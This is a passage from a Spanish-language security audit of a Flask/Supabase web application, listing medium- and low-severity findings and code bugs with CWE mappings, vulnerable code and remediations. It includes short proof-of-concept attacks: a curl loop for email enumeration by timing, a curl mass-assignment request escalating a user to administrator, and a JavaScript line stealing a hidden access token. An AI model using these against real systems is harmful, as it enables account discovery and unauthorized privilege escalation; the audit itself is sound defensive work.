- Stack traces parciales.
- URLs internas (e.g., `https://supabase-auth.internal/...`).
- Mensajes de la capa de dominio que revelan lógica de negocio.

**Impacto:**

- **Information leakage** que facilita ataques (e.g., saber si un email ya está registrado).
- **Fingerprinting** de versiones de librerías.
- **Reconnaissance** de arquitectura interna.

**Remediación:**

```python
# Logger interno con detalle
logger = logging.getLogger(__name__)

try:
    uc.crear(...)
except ValueError as e:
    # Excepciones de dominio — mensaje al usuario, pero sin detalles técnicos
    logger.info(f"Error de validación en crear padrino: {e}")
    flash("Los datos proporcionados no son válidos.", "error")
except Exception as e:
    # Excepciones inesperadas — log completo, mensaje genérico al usuario
    logger.exception(f"Error inesperado en crear padrino: {e}")
    flash("Ocurrió un error inesperado. El equipo ha sido notificado.", "error")

# Para errores de validación específicos, mapear a mensajes user-friendly:
ERROR_MESSAGES = {
    "EMAIL_DUPLICATE": "Ya existe un usuario con ese email.",
    "EMAIL_INVALID": "El email no tiene un formato válido.",
    "PASSWORD_WEAK": "La contraseña no cumple los requisitos mínimos.",
}
```

---

### MED-04 · Email enumeration vía `recuperar-contrasena`

| Atributo | Valor |
|----------|-------|
| **Severidad** | 🟡 Medio |
| **CWE** | CWE-204: Observable Response Discrepancy |
| **OWASP** | A07:2021 — Identification and Authentication Failures |
| **Ubicación** | `auth.py:196-210` |
| **Estado** | Confirmado |

**Código vulnerable:**

```python
# auth.py:196-210
try:
    auth_service = SupabaseAuthService(get_supabase_client())
    repo = SQLAlchemyUsuarioRepository(g.db_session)
    use_case = RecuperarContrasenaUseCase(auth_service, repo)
    use_case.ejecutar(email)
    
    flash("Si el correo está registrado, recibirás un enlace para recuperar tu contraseña.", "success")
    return redirect(url_for("auth.login"))
except ValueError as e:
    flash(str(e), "error")  # ← mensaje diferente si el email no existe
    return redirect(url_for("auth.recuperar_contrasena"))
except Exception as e:
    ...
    flash("Ocurrió un error inesperado. Intenta nuevamente más tarde.", "error")
```

**Descripción:**

El mensaje flash éxito ("Si el correo está registrado...") es genérico y correcto. **Pero** el flujo `except ValueError` muestra un **mensaje diferente** (el `str(e)` del use case). Si el use case lanza `ValueError("Email no registrado")` para emails inexistentes, el atacante puede distinguir:

- Email existe → mensaje genérico de éxito.
- Email no existe → mensaje de error específico.

Adicionalmente, **timing differences**: si el use case hace query a la DB solo cuando el email existe, el response time difiere.

**Vector de ataque:**

```bash
for email in $(cat lista_emails.txt); do
    start=$(date +%s%N)
    curl -s -o /dev/null -w "%{http_code} %{time_total}" \
         -X POST https://fonbec.example.com/auth/recuperar-contrasena \
         -d "email=$email"
    # Analizar response y timing para distinguir
done
```

**Remediación:**

```python
@auth_bp.route("/recuperar-contrasena", methods=["POST"])
def recuperar_contrasena_post():
    email = request.form.get("email", "").strip().lower()
    
    # Siempre mostrar el mismo mensaje, sin importar el resultado
    GENERIC_MSG = "Si el correo está registrado, recibirás un enlace para recuperar tu contraseña."
    
    # Validar formato básico
    if not email or "@" not in email:
        flash(GENERIC_MSG, "success")
        return redirect(url_for("auth.login"))
    
    try:
        auth_service = SupabaseAuthService(get_supabase_client())
        repo = SQLAlchemyUsuarioRepository(g.db_session)
        use_case = RecuperarContrasenaUseCase(auth_service, repo)
        use_case.ejecutar(email)
    except ValueError:
        # Log interno, pero mismo mensaje al usuario
        logging.info(f"Recuperación fallida para {email}: email no registrado")
    except Exception as e:
        logging.exception(f"Error en recuperación de {email}: {e}")
    
    # Misma respuesta, mismo timing aproximado
    flash(GENERIC_MSG, "success")
    return redirect(url_for("auth.login"))
```

**Timing mitigation:**

Para evitar timing attacks, agregar un delay artificial constante o usar **constant-time comparison** en el use case:

```python
import time

def ejecutar(self, email: str):
    start = time.monotonic()
    usuario = self.repo.obtener_por_email(email)
    if usuario:
        self.auth_service.send_recovery_email(email)
    # Asegurar que el tiempo total sea siempre >= 200ms
    elapsed = time.monotonic() - start
    if elapsed < 0.2:
        time.sleep(0.2 - elapsed)
```

---

### MED-05 · Implicit Flow de OAuth deprecado (fallback)

| Atributo | Valor |
|----------|-------|
| **Severidad** | 🟡 Medio |
| **CWE** | CWE-326: Inadequate Encryption Strength |
| **OWASP** | A02:2021 — Cryptographic Failures |
| **Ubicación** | `auth.py:121-122, 230-231` |
| **Estado** | Confirmado |

**Código vulnerable:**

```python
# auth.py:121-122
# Render a simple page that extracts the hash and POSTs it (Implicit Flow fallback)
return render_template("auth/callback_fallback.html")

# auth.py:230-231
# Fallback for implicit flow (URL fragment)
return render_template("auth/callback_fallback.html", target_url=url_for("auth.nueva_contrasena"))
```

**Descripción:**

La app soporta **Implicit Flow** de OAuth 2.0 como fallback cuando no hay `code` (PKCE flow). Implicit Flow:

- Pone el `access_token` en el **URL fragment** (`#access_token=...`).
- El fragment NO se envía al servidor, pero es **accesible vía JavaScript**.
- Cualquier JS en la página (incluyendo third-party scripts, analytics, tags) puede leerlo.
- Se filtra vía `Referer` (si el usuario navega a otro sitio).
- Se filtra vía browser history.

**OAuth 2.1** (borrador) **elimina Implicit Flow**. Supabase recomienda PKCE.

**Remediación:**

1. **Eliminar el fallback a Implicit Flow**. Solo soportar PKCE flow.
2. Configurar Supabase Auth para **no usar Implicit Flow** (dashboard → Authentication → Providers → Email → disable "Enable implicit grant flow").
3. Si por compatibilidad legacy se debe mantener, al menos:
   - Limpiar el fragment del URL con JS inmediatamente: `history.replaceState(null, '', window.location.pathname)`.
   - No cargar third-party scripts en la página de callback.
   - Setear `Referrer-Policy: no-referrer` en la página de callback.

---

### MED-06 · Tokens en hidden fields de HTML

| Atributo | Valor |
|----------|-------|
| **Severidad** | 🟡 Medio |
| **CWE** | CWE-522: Insufficiently Protected Credentials |
| **OWASP** | A04:2021 — Insecure Design |
| **Ubicación** | `auth.py:177, 181, 245, 266, 270` |
| **Estado** | Confirmado |

**Código vulnerable:**

```python
# auth.py:177, 181 (set_password error paths)
return render_template("auth/completar_registro.html", access_token=access_token)

# auth.py:245 (nueva_contrasena callback_fallback path)
return render_template("auth/nueva_contrasena.html", access_token=access_token)

# auth.py:266, 270 (nueva_contrasena error paths)
return render_template("auth/nueva_contrasena.html", access_token=access_token)
```

**Descripción:**

El `access_token` se pasa al template como variable, presumiblemente para renderizarlo como `<input type="hidden" name="access_token" value="{{ access_token }}">`. Esto significa:

1. **Token en HTML source**: Visible con "Ver código fuente", DevTools, o cualquier JS.
2. **Token en browser history**: Si el form se re-envía, el body puede quedar en caché.
3. **Token en Referer**: Si el usuario clicka un link externo desde esa página, el Referer puede incluir el HTML (en algunos navegadores, solo la URL).
4. **Token en logs de proxy**: Si hay un proxy reverso que loguea bodies de POST, el token queda logueado.
5. **XSS amplify**: Cualquier XSS en la página puede robar el token con `document.querySelector('input[name=access_token]').value`.

**Remediación:**

- **No pasar tokens por forms**. Mantenerlos solo en la sesión Flask (ver MED-01 para mejora adicional).

```python
# auth.py — versión sin token en form
@auth_bp.route("/set-password", methods=["POST"])
def set_password():
    access_token = session.get("temp_access_token")
    refresh_token = session.get("temp_refresh_token")
    
    if not access_token:
        flash("Sesión expirada. Solicita un nuevo enlace de invitación.", "error")
        return redirect(url_for("auth.login"))
    
    password = request.form.get("password")
    password_confirm = request.form.get("password_confirm")
    datos_usuario = {
        "nombre": request.form.get("nombre", ""),
        ...
    }
    
    try:
        use_case = CompletarRegistroUseCase(...)
        use_case.ejecutar(access_token, password, password_confirm, datos_usuario, refresh_token=refresh_token)
        session.pop("temp_access_token", None)
        session.pop("temp_refresh_token", None)
        flash("Registro completado.", "success")
        return redirect(url_for("auth.login"))
    except ValueError as e:
        # No pasar access_token al template
        flash(str(e), "error")
        return render_template("auth/completar_registro.html")
    except Exception as e:
        logger.exception(f"Error completing registration: {e}")
        flash("Error inesperado.", "error")
        return render_template("auth/completar_registro.html")
```

```html
<!-- auth/completar_registro.html — sin hidden field de token -->
<form method="POST" action="/auth/set-password">
  <input type="hidden" name="csrf_token" value="{{ csrf_token() }}" />
  <!-- NO incluir access_token como hidden -->
  <input type="text" name="nombre" required />
  ...
</form>
```

---

### MED-07 · `directorio_rol` acepta cualquier string en `<rol>`

| Atributo | Valor |
|----------|-------|
| **Severidad** | 🟡 Medio |
| **CWE** | CWE-20: Improper Input Validation |
| **OWASP** | A03:2021 — Injection |
| **Ubicación** | `admin.py:69-83` |
| **Estado** | Confirmado |

**Código vulnerable:**

```python
# admin.py:69-83
@admin_bp.route("/directorio/<rol>", methods=["GET"])
@requiere_rol("administrador")
def directorio_rol(rol):
    ...
    filtro_rol = rol.strip().lower()  # ← solo normalización, sin whitelist
    ...
    resultado_uc = use_case.execute(
        actor_admin=g.usuario_actual,
        tipo_actor=filtro_rol,  # ← string arbitrario al use case
        ...
    )
```

**Descripción:**

El parámetro `<rol>` de la URL se acepta sin validación contra una whitelist. Aunque SQLAlchemy parametriza la query (no hay inyección SQL clásica), el use case podría:

- Hacer un `WHERE rol = ?` con cualquier string, devolviendo siempre lista vacía → comportamiento confuso.
- Si el use case hace logging, el string se loguea → log injection.
- Si el use case devuelve datos según el rol, un rol inesperado podría devolver datos no previstos (e.g., si hay un rol `superadmin` interno).

**Remediación:**

```python
ROLES_VALIDOS = frozenset({"becario", "tutor", "mediador", "padrino", "administrador"})

@admin_bp.route("/directorio/<rol>", methods=["GET"])
@requiere_rol("administrador")
def directorio_rol(rol):
    filtro_rol = rol.strip().lower()
    if filtro_rol not in ROLES_VALIDOS:
        abort(404)  # no revelar que el rol existe o no
    ...
```

---

### MED-08 · `/admin/invitar` no whitelistea el `rol`

| Atributo | Valor |
|----------|-------|
| **Severidad** | 🟡 Medio |
| **CWE** | CWE-20: Improper Input Validation |
| **OWASP** | A03:2021 — Injection |
| **Ubicación** | `admin.py:355-356` |
| **Estado** | Confirmado |

**Código vulnerable:**

```python
# admin.py:355-364
email = request.form.get("email")
rol = request.form.get("rol")

if not email or not rol:
    flash("Email y rol son requeridos.", "error")
    return redirect(url_for("admin.dashboard"))

try:
    uc = get_invitar_usuario_use_case()
    user_id = uc.execute(actor_admin=g.usuario_actual, email=email, rol=rol)
    ...
```

**Descripción:**

El `rol` se toma del form sin validación. Si el use case `InvitarUsuarioUseCase` no whiteliste los roles válidos, un admin podría:

- Invitar con rol `"superadmin"` o `"root"` que el sistema no previó.
- Si el rol se persiste tal cual en la DB, y hay lógica que chequea `rol == "superadmin"` en algún lado (introducido por bug o backdoor), se crea una escalada.

Adicionalmente, el `email` no se valida formato.

**Remediación:**

```python
import re
from email_validator import validate_email, EmailNotValidError

ROLES_INVITABLES = frozenset({"becario", "tutor", "mediador", "padrino"})

@admin_bp.route("/invitar", methods=["POST"])
@requiere_rol("administrador")
def invitar_usuario_post():
    email_raw = request.form.get("email", "").strip()
    rol = request.form.get("rol", "").strip().lower()
    
    # Validar email
    try:
        email_info = validate_email(email_raw, check_deliverability=False)
        email = email_info.normalized
    except EmailNotValidError as e:
        flash("Email no válido.", "error")
        return redirect(url_for("admin.invitar_usuario"))
    
    # Whitelist rol
    if rol not in ROLES_INVITABLES:
        flash(f"Rol no válido. Roles permitidos: {', '.join(sorted(ROLES_INVITABLES))}.", "error")
        return redirect(url_for("admin.invitar_usuario"))
    
    # Notar: "administrador" NO está en ROLES_INVITABLES — para invitar admins,
    # requerir un flujo separado con doble confirmación
    ...
```

---

### MED-09 · Logout no revoca token si `auth_service.logout` falla

| Atributo | Valor |
|----------|-------|
| **Severidad** | 🟡 Medio |
| **CWE** | CWE-645: Overly Restrictive Account Lockout Mechanism (inverso — session lingering) |
| **OWASP** | A07:2021 — Identification and Authentication Failures |
| **Ubicación** | `auth.py:81-89` |
| **Estado** | Confirmado |

**Código vulnerable:**

```python
# auth.py:81-89
access_token = session.get("access_token")
if access_token:
    try:
        auth_service = SupabaseAuthService(get_supabase_client())
        auth_service.logout(access_token)
    except Exception as e:
        logging.error(f"Error invalidating Supabase token on logout: {e}")
        
session.clear()
```

**Descripción:**

Si `auth_service.logout(access_token)` falla (e.g., Supabase caído, red timeout, token ya expirado), el error se loguea pero la sesión Flask se limpia igual. El token en Supabase **sigue activo** hasta su expiración natural.

Si el token fue robado (XSS, MITM), el atacante puede seguir usándolo contra Supabase directamente (no contra la app Flask, pero contra la API de Supabase) hasta que expire.

**Remediación:**

```python
@auth_bp.route("/logout", methods=["POST"])
def logout():
    access_token = session.get("access_token")
    refresh_token = session.get("refresh_token")
    
    if access_token:
        try:
            auth_service = SupabaseAuthService(get_supabase_client())
            # Intentar revocar ambos tokens
            if refresh_token:
                try:
                    auth_service.revoke_refresh_token(refresh_token)
                except Exception:
                    logger.warning("Could not revoke refresh_token", exc_info=True)
            auth_service.logout(access_token)
        except Exception:
            # ALERTA DE SEGURIDAD — no se pudo revocar el token
            logger.error(
                "SECURITY ALERT: Failed to revoke access_token on logout. "
                f"user_id={session.get('user_id')}, token_prefix={access_token[:20]}...",
                exc_info=True
            )
            # Marcar la sesión como "pending revocation" en DB para reintentar luego
            # o forzar al usuario a re-loguearse y reintentar revocación
    
    session.clear()
    flash("Has cerrado sesión.", "success")
    return redirect(url_for("auth.login"))
```

---

### MED-10 · Mass assignment risk en `datos_usuario` y `ActualizarPerfilRequest`

| Atributo | Valor |
|----------|-------|
| **Severidad** | 🟡 Medio |
| **CWE** | CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes |
| **OWASP** | A08:2021 — Software and Data Integrity Failures |
| **Ubicación** | `auth.py:147-154, 308-317` |
| **Estado** | Potencial (depende del use case) |

**Código vulnerable:**

```python
# auth.py:147-154 (set_password)
datos_usuario = {
    "nombre": request.form.get("nombre", ""),
    "apellido": request.form.get("apellido", ""),
    "telefono": request.form.get("telefono", ""),
    "edad": int(request.form.get("edad", 0)) if request.form.get("edad") else 0,
    "sexo": request.form.get("sexo", ""),
    "direccion": request.form.get("direccion", "")
}
# Se pasa como dict al use case → si el use case hace entity.__dict__.update(datos_usuario),
# un atacante podría añadir campos extra en el form: request.form.get("rol"),
# request.form.get("id_usuario"), request.form.get("estado"), etc.
```

**Descripción:**

Si el use case `CompletarRegistroUseCase` o `ActualizarPerfilUseCase` actualiza la entidad usando un patrón como:

```python
# Patrón VULNERABLE (no auditado pero posible)
for key, value in datos_usuario.items():
    setattr(usuario, key, value)
```

…entonces un atacante que añada campos extra al form (`rol=administrador`, `estado=activo`, `id_usuario=1`) podría sobreescribir propiedades arbitrarias de la entidad.

**Vector de ataque (PoC):**

```bash
curl -X POST https://fonbec.example.com/auth/perfil \
     -b "session=<cookie_de_becario>" \
     -d "telefono=1234" \
     -d "direccion=Calle" \
     -d "edad=25" \
     -d "sexo=M" \
     -d "rol=administrador"  # ← campo extra
# Si el use case hace mass-assign, el becario acaba siendo admin
```

**Remediación:**

- En el controller, **construir explícitamente** el objeto Request con campos tipados (no pasar dict):

```python
# auth.py
from src.application.use_cases.actualizar_perfil import ActualizarPerfilRequest

req = ActualizarPerfilRequest(
    user_id=user_id,
    rol=rol,  # de la sesión, NO del form
    telefono=request.form.get("telefono"),
    direccion=request.form.get("direccion"),
    edad=edad,
    sexo=request.form.get("sexo"),
    password_actual=request.form.get("password_actual"),
    nueva_contrasena=request.form.get("nueva_contrasena"),
)
# ActualizarPerfilRequest debe ser un dataclass con campos explícitos
# El use case hace: usuario.telefono = req.telefono; usuario.direccion = req.direccion; ...
# NUNCA: setattr(usuario, key, value) sobre un dict
```

- En el use case, **whitelist explícita** de campos modificables:

```python
CAMPOS_MODIFICABLES_PERFIL = {"telefono", "direccion", "edad", "sexo"}

class ActualizarPerfilUseCase:
    def ejecutar(self, req: ActualizarPerfilRequest):
        usuario = self.repo.obtener_por_id(req.user_id)
        for campo in CAMPOS_MODIFICABLES_PERFIL:
            valor = getattr(req, campo, None)
            if valor is not None:
                setattr(usuario, campo, valor)
        # password_actual y nueva_contrasena se manejan aparte
        if req.nueva_contrasena:
            self.auth_service.cambiar_contrasena(req.password_actual, req.nueva_contrasena)
        self.repo.guardar(usuario)
```

---

### LOW-01 · `before_request` abre DB session para estáticos

| Atributo | Valor |
|----------|-------|
| **Severidad** | 🟢 Bajo |
| **CWE** | CWE-400: Uncontrolled Resource Consumption |
| **OWASP** | A04:2021 — Insecure Design |
| **Ubicación** | `app.py:50-65` |
| **Estado** | Confirmado |

**Código vulnerable:**

```python
@app.before_request
def _open_db_session() -> None:
    g.db_session = SessionLocal()  # ← se ejecuta para TODOS los requests, incluidos /static/*
    ...
```

**Impacto:**

Cada request a `/static/css/style.css`, `/static/js/app.js`, `/static/img/logo.png` abre una conexión a la DB que no se usa. Bajo carga (e.g., página con 20 assets), multiplica por 20 las conexiones consumidas en el pool. DoS amplification.

**Remediación:**

```python
@app.before_request
def _open_db_session() -> None:
    # Saltar DB session para archivos estáticos
    if request.endpoint == "static":
        return
    
    g.db_session = SessionLocal()
    ...
```

Mejor aún: servir estáticos vía CDN o nginx directamente, no vía Flask.

---

### LOW-02 · `int()` inseguro en `edad` (set-password)

| Atributo | Valor |
|----------|-------|
| **Severidad** | 🟢 Bajo |
| **CWE** | CWE-20: Improper Input Validation |
| **OWASP** | A03:2021 — Injection |
| **Ubicación** | `auth.py:151` |
| **Estado** | Confirmado |

**Código vulnerable:**

```python
# auth.py:151
"edad": int(request.form.get("edad", 0)) if request.form.get("edad") else 0,
```

**Descripción:**

Si `edad` es `"abc"`, `int("abc")` lanza `ValueError` que es capturado por el `except Exception` general (línea 178), resultando en un mensaje genérico al usuario pero logueo con `str(e)`. Es consistente pero poco elegante.

Adicionalmente, no valida rango: `edad=-50` o `edad=9999` se aceptan.

**Remediación:**

```python
def parse_edad(raw: str | None) -> int | None:
    if not raw:
        return None
    try:
        edad = int(raw)
    except ValueError:
        raise ValueError("La edad debe ser un número entero.")
    if not 0 <= edad <= 120:
        raise ValueError("La edad debe estar entre 0 y 120.")
    return edad
```

---

### LOW-03 · Comparación case-sensitive de email en eliminaciones

| Atributo | Valor |
|----------|-------|
| **Severidad** | 🟢 Bajo |
| **CWE** | CWE-178: Improper Handling of Case Sensitivity |
| **OWASP** | A07:2021 |
| **Ubicación** | `admin.py:207, 231` |
| **Estado** | Potencial (depende del use case) |

**Código vulnerable:**

```python
# admin.py:207, 231
email_confirmacion = request.form.get("email_confirmacion", "").strip()
# Se pasa al use case, que debe comparar con el email del referente/becario
```

**Descripción:**

Si el use case compara `email_confirmacion != usuario.email` sin normalizar case, un atacante que conozca el email pero use mayúsculas distintas puede bypassar el check de confirmación:

- Email real: `Admin@Fonbec.org`
- Atacante envía: `admin@fonbec.org`
- Comparación case-sensitive: diferentes → bypass del check de seguridad

**Remediación:**

```python
# En el use case
email_confirmacion_norm = email_confirmacion.strip().lower()
if email_confirmacion_norm != usuario.email.strip().lower():
    raise ValueError("El email de confirmación no coincide.")
```

---

### LOW-04 · Sliding expiration ausente

| Atributo | Valor |
|----------|-------|
| **Severidad** | 🟢 Bajo |
| **CWE** | CWE-613: Insufficient Session Expiration |
| **OWASP** | A07:2021 |
| **Ubicación** | `app.py:37` |
| **Estado** | Confirmado |

**Descripción:**

`PERMANENT_SESSION_LIFETIME = 30 min` es una expiración absoluta (no sliding). Tras 30 min desde el login, la sesión expira sin importar la actividad. Esto es más seguro pero peor UX. Si se prefiere sliding (renovar en cada request), se puede implementar manualmente.

**Decisión de diseño**: la expiración absoluta es más segura y recomendada para apps con datos sensibles (Fonbec maneja datos de menores becarios). **Mantener como está**, pero considerar reducir a 15 min para mayor seguridad.


---

## 7. Errores de Código (No-Vulnerabilidades)

Esta sección cubre bugs, malas prácticas y errores de implementación que no son vulnerabilidades de seguridad directas, pero afectan la robustez, mantenibilidad y pueden indirectamente crear riesgos.

### BUG-01 · Manejo de excepciones inconsistente

**Severidad:** Medio (mantenibilidad)
**Ubicación:** Todos los controllers

**Descripción:**

Cada controller maneja excepciones de forma diferente, sin un patrón consistente:

| Archivo:Línea | Patrón |
|---------------|--------|
| `auth.py:67-74` (login_post) | `except ValueError` + `except Exception` — correcto |
| `auth.py:175-181` (set_password) | `except ValueError` + `except Exception` — correcto |
| `admin.py:169-170` (nuevo_padrino) | `except Exception` (captura todo) — **no diferencia dominio de infra** |
| `admin.py:215-221` (eliminar_referente) | `except ValueError` + `except Exception` — correcto |
| `admin.py:316-321` (vincular_actor) | `except ValueError` + `except TypeError` + `except Exception` — específico |
| `becario.py:132-134` (editar_formulario) | `except (ValueError, TypeError)` — captura pero continúa al GET logic |
| `tutor.py:105-107` (auditoria) | `except ValueError` solo — **no captura Exception** |

**Problemas:**

1. **Algunos routes no capturan `Exception`**: Si el use case lanza una excepción no esperada (e.g., `sqlalchemy.exc.OperationalError`), el usuario ve un 500 con traceback (si debug=True) o un 500 genérico.

2. **`admin.py:170` captura todo con `except Exception`**: Excepciones de dominio (`ValueError`) se mezclan con excepciones de infraestructura, mostrando `str(e)` al usuario (ver MED-03).

3. **Inconsistencia en `rollback()`**: `admin.py:213` hace commit explícito, `admin.py:237` hace rollback explícito, pero `auth.py` nunca hace commit/rollback explícito (depende del teardown). Esto significa que el `CompletarRegistroUseCase` no persiste cambios a menos que el teardown lo haga — pero si el use case falla parcialmente, el teardown commitea igual (ver CRIT-05).

**Remediación:**

Crear un error handler centralizado:

```python
# src/web/error_handlers.py
from flask import Flask, flash, redirect, url_for, render_template
import logging

def register_error_handlers(app: Flask):
    @app.errorhandler(403)
    def forbidden(e):
        flash("No tenés permisos para acceder a esta página.", "error")
        return redirect(url_for("auth.login"))
    
    @app.errorhandler(404)
    def not_found(e):
        return render_template("error.html", message="Página no encontrada."), 404
    
    @app.errorhandler(500)
    def internal_error(e):
        logging.exception("500 error")
        return render_template("error.html", message="Error interno del servidor."), 500
    
    @app.errorhandler(Exception)
    def handle_unexpected(e):
        logging.exception(f"Unhandled exception: {e}")
        if app.debug:
            raise  # dejar que Flask muestre el debugger
        flash("Ocurrió un error inesperado.", "error")
        return redirect(url_for("auth.login"))
```

```python
# src/web/controller_utils.py
from contextlib import contextmanager
from flask import flash, g, redirect, url_for
import logging

logger = logging.getLogger(__name__)

@contextmanager
def safe_use_case_call(*, success_msg: str, success_redirect: str, error_redirect: str):
    """Context manager para ejecutar un use case de forma segura."""
    try:
        yield
        flash(success_msg, "success")
        return redirect(url_for(success_redirect))
    except ValueError as e:
        logger.info(f"Domain validation error: {e}")
        flash(_friendly_message(str(e)), "error")
    except PermissionError as e:
        logger.warning(f"Permission denied: {e}")
        flash("No tenés permisos para realizar esta acción.", "error")
    except Exception as e:
        logger.exception(f"Unexpected error: {e}")
        if g.db_session:
            g.db_session.rollback()
        flash("Ocurrió un error inesperado.", "error")
    return redirect(url_for(error_redirect))

# Uso:
@ admin_bp.route("/padrinos/nuevo", methods=["POST"])
@requiere_rol("administrador")
def nuevo_padrino():
    datos = {...}
    with safe_use_case_call(
        success_msg="Padrino creado exitosamente.",
        success_redirect="admin.listar_padrinos",
        error_redirect="admin.nuevo_padrino"
    ) as _:
        uc = get_padrinos_use_case()
        uc.crear(actor_admin=g.usuario_actual, datos=datos)
```

---

### BUG-02 · Race condition en `temp_access_token` / `temp_refresh_token`

**Severidad:** Medio
**Ubicación:** `auth.py:114-115, 132-133, 222-224, 243-244, 259-260`

**Descripción:**

Las claves `temp_access_token` y `temp_refresh_token` se usan tanto en el flujo de `/callback` (invitación) como en `/nueva-contrasena` (recuperación). Si un usuario:

1. Abre una tab con un enlace de invitación (temp tokens A set).
2. Abre otra tab con un enlace de recuperación (temp tokens B pisan a A).
3. Vuelve a la primera tab y completa el registro → usa tokens B (que son de recuperación, no de invitación).

Resultado: comportamiento impredecible, posible ejecución del use case equivocado.

Adicionalmente, no hay expiración explícita de los temp tokens. Si el usuario abandona el flujo a medias, los tokens quedan en la sesión hasta la próxima acción que los sobrescriba o clear.

**Remediación:**

- Usar claves separadas por flujo: `temp_invite_access_token`, `temp_recovery_access_token`.
- Setear un timestamp de creación y expirar los temp tokens tras 5 min.
- Considerar mover los temp tokens a una tabla `pending_flows` en la DB con FK al user_id, en vez de la sesión.

```python
# auth.py
import time

TEMP_TOKEN_TTL = 300  # 5 min

def _set_temp_tokens(prefix: str, access: str, refresh: str):
    session[f"{prefix}_access_token"] = access
    session[f"{prefix}_refresh_token"] = refresh
    session[f"{prefix}_created_at"] = time.time()

def _get_temp_tokens(prefix: str) -> tuple[str, str] | None:
    access = session.get(f"{prefix}_access_token")
    refresh = session.get(f"{prefix}_refresh_token")
    created = session.get(f"{prefix}_created_at")
    if not access or not created:
        return None
    if time.time() - created > TEMP_TOKEN_TTL:
        _clear_temp_tokens(prefix)
        return None
    return access, refresh

def _clear_temp_tokens(prefix: str):
    for key in [f"{prefix}_access_token", f"{prefix}_refresh_token", f"{prefix}_created_at"]:
        session.pop(key, None)
```

---

### BUG-03 · Imports dentro de funciones (circular dependency smell)

**Severidad:** Bajo (mantenibilidad)
**Ubicación:** `app.py:36, 47, 48, 81-84, 92`

**Descripción:**

Varios imports están dentro de funciones en vez de al top del módulo:

```python
# app.py:36
from datetime import timedelta

# app.py:47-48
from flask import session
from src.infrastructure.repositories import SQLAlchemyUsuarioRepository

# app.py:81-84
from src.web.routes.becario import becario_bp
from src.web.routes.tutor import tutor_bp
from src.web.routes.admin import admin_bp
from src.web.routes.auth import auth_bp

# app.py:92
from flask import redirect, url_for
```

Esto sugiere **imports circulares**: `app.py` importa de `routes`, y `routes` importa de `app.py` (probablemente vía `current_app` o `g`). Es un code smell que dificulta el razonamiento sobre dependencias.

**Remediación:**

- Los imports dentro de `create_app()` son aceptables para evitar circular imports en Flask (patrón de Application Factory). **Documentarlo**.
- Los imports de `flask` y `datetime` deberían ir al top — no hay razón para deferirlos.
- Reorganizar: si `routes/auth.py` necesita `g`, debe importarlo de `flask`, no de `app.py`.

---

### BUG-04 · Conversión `int()` inconsistente entre set-password y perfil

**Severidad:** Bajo
**Ubicación:** `auth.py:151` vs `auth.py:297`

**Código:**

```python
# auth.py:151 (set_password) — sin isdigit()
"edad": int(request.form.get("edad", 0)) if request.form.get("edad") else 0,

# auth.py:297 (perfil) — con isdigit()
edad = int(edad_str) if edad_str and edad_str.isdigit() else None
```

**Descripción:**

Dos rutas que procesan el mismo campo `edad` usan lógica diferente. `set-password` falla con `ValueError` si el input no es numérico; `perfil` devuelve `None` silenciosamente. Inconsistencia que complica el testing y puede introducir bugs.

**Remediación:**

Extraer a una función compartida (ver LOW-02).

---

### BUG-05 · Falta de logging estructurado y de auditoría

**Severidad:** Medio (compliance)
**Ubicación:** Todos los controllers

**Descripción:**

El logging es ad-hoc con `logging.error(f"...")`. No hay:

1. **Logging estructurado** (JSON) para ingesta en SIEM.
2. **Eventos de auditoría**: login success/failure, logout, password change, profile update, admin actions (delete, invite, vincular), 403 access denied.
3. **Correlación**: no se incluye `request_id`, `user_id`, `ip` en los logs.
4. **Niveles apropiados**: todo se loguea como `error` o `info`, sin distinguir `warning` (e.g., intento de acceso denegado) de `error` (e.g., fallo de infraestructura).

Para una plataforma que maneja datos de menores (becarios), esto es un issue de compliance (GDPR-like, Ley 25.326 Argentina).

**Remediación:**

```python
# src/web/logging_config.py
import logging
import json
import sys
from flask import g, request

class JSONFormatter(logging.Formatter):
    def format(self, record):
        log_data = {
            "timestamp": self.formatTime(record),
            "level": record.levelname,
            "logger": record.name,
            "message": record.getMessage(),
            "request_id": getattr(g, "request_id", None),
            "user_id": getattr(g, "usuario_actual", None).id_usuario if getattr(g, "usuario_actual", None) else None,
            "ip": request.remote_addr if request else None,
            "path": request.path if request else None,
            "method": request.method if request else None,
        }
        if record.exc_info:
            log_data["exception"] = self.formatException(record.exc_info)
        return json.dumps(log_data)

def configure_logging(app):
    handler = logging.StreamHandler(sys.stdout)
    handler.setFormatter(JSONFormatter())
    app.logger.addHandler(handler)
    app.logger.setLevel(logging.INFO)

# src/web/audit.py
import logging
audit_logger = logging.getLogger("audit")

def log_audit(event: str, **kwargs):
    audit_logger.info(event, extra={"audit": True, **kwargs})

# Uso en controllers:
log_audit("login_success", user_id=user.id_usuario, rol=user.rol)
log_audit("login_failure", email=email, reason="invalid_credentials")
log_audit("becario_deleted", becario_id=id_becario, admin_id=g.usuario_actual.id_usuario)
log_audit("access_denied", path=request.path, user_id=g.usuario_actual.id_usuario, required_role="administrador")
```

---

### BUG-06 · Validación de `pagina` no valida rango

**Severidad:** Bajo
**Ubicación:** `admin.py:78-80, 117-120`

**Código:**

```python
try:
    pagina = int(request.args.get("pagina", 1))
except ValueError:
    pagina = 1
```

**Descripción:**

`pagina = -1` o `pagina = 999999999` se aceptan. Dependiendo del ORM, esto puede causar:

- `pagina = -1`: SQL `OFFSET -10` → error o comportamiento indefinido.
- `pagina = 999999999`: SQL `OFFSET 9999999990` → query lento, DoS.

**Remediación:**

```python
try:
    pagina = max(1, int(request.args.get("pagina", 1)))
except (ValueError, TypeError):
    pagina = 1
```

---

### BUG-07 · Carga de 1000 actores por cada request al detalle de becario

**Severidad:** Medio (performance)
**Ubicación:** `admin.py:273-275`

**Código:**

```python
tutores_res = listar_uc.execute(actor_admin=g.usuario_actual, tipo_actor="tutor", pagina=1, limite=1000)
mediadores_res = listar_uc.execute(actor_admin=g.usuario_actual, tipo_actor="mediador", pagina=1, limite=1000)
padrinos_res = listar_uc.execute(actor_admin=g.usuario_actual, tipo_actor="padrino", pagina=1, limite=1000)
```

**Descripción:**

Cada GET a `/admin/becarios/<id>/detalle` carga hasta **3000 actores** en memoria para popular selects de vinculación. Esto:

- Consume memoria innecesaria.
- Genera 3 queries pesadas por request.
- Es un vector de DoS amplification (un atacante puede hacer N requests concurrentes y multiplicar la carga).

**Remediación:**

- Paginar los selects (e.g., autocomplete con search-as-you-type).
- Cachear la lista de actores con TTL corto (e.g., 60s en Redis).
- Si se necesitan todos, hacer una sola query con `tipo_actor IN (...)` en vez de 3 separadas.

---

